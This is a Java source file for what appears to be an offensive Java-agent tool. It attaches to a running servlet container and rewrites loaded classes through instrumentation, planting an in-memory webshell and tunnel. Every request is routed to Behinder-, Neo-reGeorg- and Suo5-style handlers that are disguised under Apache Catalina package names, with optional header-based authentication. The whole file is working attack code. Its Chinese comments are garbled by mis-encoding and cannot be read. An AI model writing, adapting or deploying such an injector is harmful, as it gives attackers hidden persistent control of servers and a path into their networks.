package indi.augusttheodor;

import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;

import org.apache.catalina.core.ExtendServices;
import org.apache.catalina.core.NeoServices;
import org.apache.catalina.core.RebeyondServices;
import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.util.HashMap;

public class AgenstMain {

    public static void main(String[] args){
        //SB VSCODE ���� ���ұ���
        //�ҵ�ע�ͣ�
        try{
            String edit="";
            for(String a:args){
                edit+=a;
                edit+="\n";
            }
            AttachA.doAttach(edit);
        } catch (AgentLoadException | IOException | AgentInitializationException e) {
            throw new RuntimeException(e);  //�����㴦����Ȼд��
        }

    }

    public static void agentmain(String agentArgs, Instrumentation ins) throws Exception {
        //���������Ϊagentʱ����� ˭����
       Options cmd=new Options(agentArgs);
        if(cmd.hasOption("u")){
            //�޸Ĵ���
            ExtendServices.SERVICE_URL=cmd.getOptionValue("u")+"E";
            RebeyondServices.SERVICE_URL=cmd.getOptionValue("u")+"R";
            NeoServices.SERVICE_URL=cmd.getOptionValue("u")+"N";
        }
        if(cmd.hasOption("uR")){
            //ʹ�õ�ʱ���Ϊ���Լ��˴����
            RebeyondServices.SERVICE_URL=cmd.getOptionValue("uR");
        }
        if(cmd.hasOption("uN")){
            NeoServices.SERVICE_URL=cmd.getOptionValue("uN");
        }
        if(cmd.hasOption("uE")){
            ExtendServices.SERVICE_URL=cmd.getOptionValue("uE");
        }
        String sc="boolean scFlag=true;"; //��ӵ�У�黷��
        if(cmd.hasOption("a")){
            System.out.println(cmd.getOptionValue("a"));
            String[] authKey= cmd.getOptionValue("a").split(":");
            sc="boolean scFlag=request.getHeader(\""+authKey[0]+"\")==null?\""+authKey[1]+"\"==null : request.getHeader(\""+authKey[0]+"\").equals(\""+authKey[1]+"\");";
        }
        TransformerA.init();
        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //����дע���ˣ�Ҫ�����VSCODE
        Class[] classes = ins.getAllLoadedClasses();
        //ö�������Ѽ����࣬Ȼ�������ǵ�ע�������Ƿ������Щ
        for (Class c : classes) {
            if (hm.containsKey(c.getName())) {
                //��������أ��Ǿ�ʹ��Transformer�����ֽ������ע��
                for(String mN : hm.get(c.getName())){ //�����б�ȡ������Ҫע��ķ���
                    TransformerA tA = new TransformerA(mN,c.getName());
                    tA.setSourceCode("{" +
                            "javax.servlet.http.HttpServletRequest request=(javax.servlet.http.HttpServletRequest)$1;\n" +
                            "javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)$2;\n" +
                            sc +
                            "System.out.println(scFlag);" +
                            "if(scFlag==true){" +
                            "   java.util.Map rdd=new java.util.HashMap();\n" +
                            "   rdd.put(\"url\",request.getServletPath());\n" +
                            "   rdd.put(\"method\",request.getMethod());\n" +
                            "   rdd.put(\"b\",request.getReader().readLine());\n" +
                            "   java.util.Map s=new java.util.HashMap();\n" +
                            "   s.put(\"request\",request);\n" +
                            "   s.put(\"response\",response);\n" +
                            "   s.put(\"session\",request.getSession());" +
                            "   org.apache.catalina.core.RebeyondServices.doServices(rdd,s);" +
                            "   org.apache.catalina.core.ExtendServices.doServices(rdd,s);" +
                          //"   org.apache.catalina.core.Suo5Services.doServices(rdd,s);" + //���ô˹�����Ҫ���±��룬�뿴Suo5Services
                            "   org.apache.catalina.core.NeoServices.doServices(rdd,s);" +
                            "   }" +
                            "}"); //ǰ�ã��ڱ�ע�뻷���ڻ�ȡ������Ҫ�����ݣ�Ȼ�����agent����
                    try {
                        ClassDefinition cd=new ClassDefinition(c, tA.getBytes(c));
                        ins.redefineClasses(cd);
                    } catch (UnmodifiableClassException e) {
                        System.out.println(mN+"------"+c.getName()+"------"+"����ע�룡");
                    } catch (ClassNotFoundException e) {
                        throw new RuntimeException(e);
                    }
                }

            }
        }
    }

}